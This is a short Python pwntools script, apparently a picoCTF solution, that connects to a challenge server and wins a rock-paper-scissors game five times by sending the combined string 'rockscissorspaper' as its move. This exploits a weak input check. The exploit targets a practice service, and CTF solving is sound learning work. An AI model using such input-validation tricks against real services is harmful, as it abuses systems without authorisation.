from pwn import * 


def main():
	r = remote("saturn.picoctf.net", 64360)
	for i in range(0, 5):
		r.recvuntil(b'Type \'2\' to exit the program')
		r.sendline(b'1')
		r.recvuntil(b'Please make your selection (rock/paper/scissors):')
		r.sendline(b'rockscissorspaper')
	r.interactive()
if __name__ == "__main__":
	main()